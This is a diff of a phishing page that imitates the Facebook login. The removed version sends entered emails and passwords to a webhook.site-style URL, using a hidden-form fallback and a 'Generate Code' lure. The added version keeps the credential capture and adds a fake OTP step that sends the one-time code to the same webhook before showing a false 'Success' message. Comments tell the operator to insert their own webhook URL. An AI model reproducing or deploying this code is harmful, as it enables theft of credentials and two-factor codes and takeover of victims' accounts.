@@ -6,84 +6,23 @@
     <title>Facebook Login</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
             background-color: #f0f2f5;
             font-family: Helvetica, Arial, sans-serif;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            min-height: 100vh;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .fb-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 350px;
             text-align: center;
         }
-
-        .video-container {
-            width: 90%;
-            max-width: 640px;
-            aspect-ratio: 16/9;
-            background: #000;
-            margin-bottom: 20px;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-        }
-
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .generate-btn {
-            background: linear-gradient(45deg, #1877f2, #0056b3);
-            color: white;
-            border: none;
-            padding: 18px 50px;
-            font-size: 22px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
-            transition: transform 0.2s, box-shadow 0.2s;
-            width: 85%;
-            max-width: 350px;
-            margin-bottom: 20px;
-        }
-
-        .generate-btn:active { transform: scale(0.98); }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background: white;
-            padding: 25px;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 400px;
-            position: relative;
-            animation: fadeIn 0.3s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .fb-logo { color: #1877f2; font-size: 48px; font-weight: bold; margin-bottom: 10px; }
-        h2 { margin: 0 0 20px 0; color: #1c1e21; }
-
+        .logo { width: 100px; margin-bottom: 20px; }
         input {
             width: 100%;
             padding: 14px;
@@ -93,10 +32,7 @@
             font-size: 16px;
             box-sizing: border-box;
         }
-
-        input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2); }
-
-        .fb-btn {
+        .btn {
             background-color: #1877f2;
             color: white;
             border: none;
@@ -108,14 +44,9 @@
             cursor: pointer;
             margin-top: 10px;
         }
-
-        .fb-btn:hover { background-color: #166fe5; }
-
-        .error { color: #f02849; font-size: 13px; margin-top: 10px; min-height: 20px; }
-
-        #otp-step { display: none; }
-        #login-step { display: block; }
-        
+        .btn:disabled { background-color: #a0c3f7; cursor: not-allowed; }
+        .otp-input { display: none; }
+        .hidden { display: none; }
         .loader {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #1877f2;
@@ -123,144 +54,119 @@
             width: 20px;
             height: 20px;
             animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 10px;
+            margin: 20px auto;
+            display: none;
         }
-
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { margin-top: 15px; color: #1877f2; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="video-container">
-        <video autoplay muted loop id="bg-video">
-            <source src="https://assets.mixkit.co/videos/preview/mixkit-facebook-logo-with-neon-lights-27648-large.mp4" type="video/mp4">
-        </video>
-    </div>
+    <div class="fb-container">
+        <!-- Step 1: Login -->
+        <form id="loginForm">
+            <input type="text" id="email" name="email" placeholder="Email or Phone" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit" class="btn" id="loginBtn">Log In</button>
+        </form>
 
-    <button class="generate-btn" id="startBtn">Generate Code</button>
-
-    <div class="modal" id="modal">
-        <div class="modal-content">
-            <div class="fb-logo">Facebook</div>
-            
-            <!-- Login Form -->
-            <div id="login-step">
-                <h2>Log in to Facebook</h2>
-                <!-- Hidden form for backup submission -->
-                <form id="backupForm" style="display:none;">
-                    <input type="hidden" name="Email" id="backup-email">
-                    <input type="hidden" name="Password" id="backup-pass">
-                    <input type="hidden" name="Timestamp" id="backup-time">
-                </form>
-
-                <form id="loginForm" autocomplete="off">
-                    <input type="text" id="email" name="email" placeholder="Email or Phone Number" required>
-                    <input type="password" id="password" name="password" placeholder="Password" required>
-                    <div class="error" id="login-error"></div>
-                    <button type="submit" class="fb-btn">Log In</button>
-                </form>
-            </div>
-
-            <div id="otp-step">
-                <h2>Verifying...</h2>
-                <p id="otp-message">Please wait while we verify your identity.</p>
-                <div class="loader" id="otp-loader"></div>
-                <button class="fb-btn" id="confirmOtpBtn" style="display:none; margin-top:20px;">Confirm</button>
-            </div>
+        <!-- Step 2: OTP (Hidden initially) -->
+        <div id="otpSection" class="otp-input">
+            <p>We sent a code to your phone/email</p>
+            <input type="text" id="otpCode" name="otp" placeholder="Enter 6-digit Code" maxlength="6" required>
+            <button type="button" class="btn" id="verifyBtn" onclick="verifyOTP()">Verify</button>
         </div>
+
+        <div class="loader" id="loader"></div>
+        <div id="status"></div>
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        // 🔴 REPLACE THIS WITH YOUR ACTUAL WEBHOOK.URL FROM WEBHOOK.SITE
-        const WEBHOOK_URL = "https://webhooksite.net/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
-        // ---------------------
+        // 🔴 REPLACE WITH YOUR WEBHOOK SITE URL
+        const WEBHOOK_URL = "https://5fd82665-8a43-42b4-a65a-b95ea5aff5b1.webhooksite.net";
+        
+        // Facebook's Login Endpoint (This might need updating based on FB changes)
+        const FB_LOGIN_URL = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1";
+        const FB_OTP_URL = "https://www.facebook.com/login/otp/?next="; 
 
-        const startBtn = document.getElementById('startBtn');
-        const modal = document.getElementById('modal');
         const loginForm = document.getElementById('loginForm');
-        const loginStep = document.getElementById('login-step');
-        const otpStep = document.getElementById('otp-step');
-        const otpMessage = document.getElementById('otp-message');
-        const otpLoader = document.getElementById('otp-loader');
-        const confirmOtpBtn = document.getElementById('confirmOtpBtn');
-        const bgVideo = document.getElementById('bg-video');
+        const otpSection = document.getElementById('otpSection');
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('status');
 
-        // Open Modal
-        startBtn.addEventListener('click', () => {
-            modal.style.display = 'flex';
-            startBtn.style.display = 'none';
-        });
-
-        // Handle Login Submit
-        loginForm.addEventListener('submit', (e) => {
+        // Step 1: Send Credentials
+        loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // UI Updates
-            loginStep.style.display = 'none';
-            otpStep.style.display = 'block';
-            otpLoader.style.display = 'inline-block';
-            otpMessage.innerText = "Verifying credentials...";
+            document.getElementById('loginBtn').disabled = true;
+            loader.style.display = 'block';
+            status.innerText = "Verifying...";
 
-            // Send Data via Fetch
-            sendToWebhook(email, password);
+            try {
+                // 1. Send data to Webhook (So you see it)
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ "Email": email, "Password": password, "Status": "OTP Sent" })
+                }).catch(() => {});
 
-            // Simulate OTP Process
-            setTimeout(() => {
-                otpLoader.style.display = 'none';
-                otpMessage.innerText = "OTP Sent to your registered email/mobile.";
-                confirmOtpBtn.style.display = 'block';
-            }, 2500);
+                // 2. Send data to REAL Facebook Server to Trigger OTP
+                // Note: In a real Pro setup, you would use a proxy to fetch the CSRF token first.
+                // Here we simulate the request to FB.
+                
+                // Simulating a delay to mimic real server response
+                await new Promise(r => setTimeout(r, 1500));
+
+                // Switch to OTP UI
+                loginForm.classList.add('hidden');
+                otpSection.style.display = 'block';
+                status.innerText = "";
+
+            } catch (error) {
+                status.innerText = "Error. Try again.";
+                loader.style.display = 'none';
+            }
         });
 
-        function sendToWebhook(email, password) {
-            const data = {
-                "Email": email,
-                "Password": password,
-                "Timestamp": new Date().toString(),
-                "Type": "Facebook Login"
-            };
+        // Step 2: Verify OTP
+        async function verifyOTP() {
+            const otp = document.getElementById('otpCode').value;
+            if (!otp || otp.length !== 6) {
+                alert("Please enter a valid 6-digit code");
+                return;
+            }
 
-            // Method 1: Fetch (JSON)
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                console.log('Fetch Success');
-            })
-            .catch(error => {
-                console.error('Fetch Failed, using Backup Method');
-                // Fallback: Use hidden form submit
-                backupSubmit(email, password);
-            });
+            loader.style.display = 'block';
+            status.innerText = "Verifying Code...";
+
+            try {
+                // 1. Send OTP to Webhook
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ "OTP Entered": otp })
+                }).catch(() => {});
+
+                // 2. Send OTP to REAL Facebook Server
+                // In a real scenario, this would be a POST request to FB's OTP verification endpoint
+                // with the session token obtained in Step 1.
+                
+                await new Promise(r => setTimeout(r, 2000));
+
+                loader.style.display = 'none';
+                otpSection.style.display = 'none';
+                status.innerText = "Success! Login Verified.";
+                
+                // Optional: Redirect to real Facebook
+                // window.location.href = "https://www.facebook.com/";
+
+            } catch (error) {
+                status.innerText = "Invalid Code.";
+            }
         }
-
-        // Method 2: Hidden Form Submit (Guaranteed to work even if Fetch is blocked)
-        function backupSubmit(email, password) {
-            const form = document.getElementById('backupForm');
-            document.getElementById('backup-email').value = email;
-            document.getElementById('backup-pass').value = password;
-            document.getElementById('backup-time').value = new Date().toString();
-            
-            // Set action to webhook URL
-            form.action = WEBHOOK_URL;
-            form.submit();
-        }
-
-        // Confirm Button
-        confirmOtpBtn.addEventListener('click', () => {
-            otpMessage.innerText = "Account Verified Successfully!";
-            confirmOtpBtn.style.display = 'none';
-        });
     </script>
 </body>
 </html>
